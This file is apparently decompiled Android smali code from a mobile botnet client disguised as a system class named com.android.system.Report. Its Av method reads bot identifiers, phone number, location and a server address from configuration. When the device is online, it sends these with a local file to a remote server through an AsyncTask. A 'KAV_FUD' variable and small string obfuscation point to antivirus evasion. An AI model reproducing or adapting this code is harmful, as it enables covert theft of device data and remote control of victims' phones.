.class public Lcom/android/system/Report;
.super Ljava/lang/Object;
.source "Report.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/system/Report$AvJump;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 22
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private Connected(Landroid/content/Context;)Z
    .locals 3
    .param p1, "c"    # Landroid/content/Context;

    .prologue
    .line 62
    const-string v2, "connectivity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 63
    .local v0, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    .line 65
    .local v1, "netInfo":Landroid/net/NetworkInfo;
    if-eqz v1, :cond_0

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 66
    const/4 v2, 0x1

    .line 70
    :goto_0
    return v2

    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method

.method private getFile(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 1
    .param p1, "c"    # Ljava/lang/String;
    .param p2, "d"    # Landroid/content/Context;

    .prologue
    .line 56
    invoke-virtual {p2, p1}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method public Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 18
    .param p1, "a"    # Ljava/lang/String;
    .param p2, "b"    # Ljava/lang/String;
    .param p3, "c"    # Ljava/lang/String;
    .param p4, "e"    # Ljava/lang/String;
    .param p5, "d"    # Landroid/content/Context;

    .prologue
    .line 26
    new-instance v13, Lcom/android/system/IO;

    invoke-direct {v13}, Lcom/android/system/IO;-><init>()V

    const-string v14, "BotID"

    move-object/from16 v0, p5

    invoke-virtual {v13, v14, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    .line 27
    .local v3, "BotID":Ljava/lang/String;
    new-instance v13, Lcom/android/system/IO;

    invoke-direct {v13}, Lcom/android/system/IO;-><init>()V

    const-string v14, "BotNetwork"

    move-object/from16 v0, p5

    invoke-virtual {v13, v14, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    .line 28
    .local v5, "BotNetwork":Ljava/lang/String;
    new-instance v13, Lcom/android/system/IO;

    invoke-direct {v13}, Lcom/android/system/IO;-><init>()V

    const-string v14, "BotLocation"

    move-object/from16 v0, p5

    invoke-virtual {v13, v14, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    .line 29
    .local v4, "BotLocation":Ljava/lang/String;
    new-instance v13, Lcom/android/system/IO;

    invoke-direct {v13}, Lcom/android/system/IO;-><init>()V

    const-string v14, "HG"

    move-object/from16 v0, p5

    invoke-virtual {v13, v14, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    .line 30
    .local v9, "HttpServer":Ljava/lang/String;
    new-instance v13, Lcom/android/system/IO;

    invoke-direct {v13}, Lcom/android/system/IO;-><init>()V

    const-string v14, "BotVer"

    move-object/from16 v0, p5

    invoke-virtual {v13, v14, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    .line 31
    .local v8, "BotVer":Ljava/lang/String;
    sget-object v11, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 32
    .local v11, "SDK":Ljava/lang/String;
    new-instance v13, Lcom/android/system/IO;

    invoke-direct {v13}, Lcom/android/system/IO;-><init>()V

    const-string v14, "BotPrefix"

    move-object/from16 v0, p5

    invoke-virtual {v13, v14, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    .line 33
    .local v7, "BotPrefix":Ljava/lang/String;
    new-instance v13, Lcom/android/system/IO;

    invoke-direct {v13}, Lcom/android/system/IO;-><init>()V

    const-string v14, "BotPhone"

    move-object/from16 v0, p5

    invoke-virtual {v13, v14, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    .line 34
    .local v6, "BotPhone":Ljava/lang/String;
    const-string v12, ""

    .line 35
    .local v12, "init":Ljava/lang/String;
    invoke-virtual/range {p4 .. p4}, Ljava/lang/String;->length()I

    move-result v13

    if-gtz v13, :cond_1

    const-string v12, "cmd"

    .line 36
    :goto_0
    const-string v13, "&preHix="

    const-string v14, "H"

    const-string v15, "f"

    invoke-virtual {v13, v14, v15}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    .line 40
    .local v10, "KAV_FUD":Ljava/lang/String;
    move-object/from16 v0, p0

    move-object/from16 v1, p5

    invoke-direct {v0, v1}, Lcom/android/system/Report;->Connected(Landroid/content/Context;)Z

    move-result v13

    if-eqz v13, :cond_0

    .line 42
    new-instance v13, Lcom/android/system/Report$AvJump;

    move-object/from16 v0, p0

    invoke-direct {v13, v0}, Lcom/android/system/Report$AvJump;-><init>(Lcom/android/system/Report;)V

    const/4 v14, 0x3

    new-array v14, v14, [Ljava/lang/String;

    const/4 v15, 0x0

    .line 44
    new-instance v16, Ljava/lang/StringBuilder;

    const-string v17, "&b="

    invoke-direct/range {v16 .. v17}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v16

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "&c="

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "&d="

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "&e="

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "&f="

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "&g="

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "&h="

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    move-object/from16 v1, p2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "&i="

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    move-object/from16 v0, v16

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v16

    aput-object v16, v14, v15

    const/4 v15, 0x1

    .line 45
    move-object/from16 v0, p0

    move-object/from16 v1, p3

    move-object/from16 v2, p5

    invoke-direct {v0, v1, v2}, Lcom/android/system/Report;->getFile(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v16

    aput-object v16, v14, v15

    const/4 v15, 0x2

    .line 46
    aput-object v9, v14, v15

    .line 42
    invoke-virtual {v13, v14}, Lcom/android/system/Report$AvJump;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 51
    :cond_0
    return-void

    .line 35
    .end local v10    # "KAV_FUD":Ljava/lang/String;
    :cond_1
    move-object/from16 v12, p4

    goto/16 :goto_0
.end method
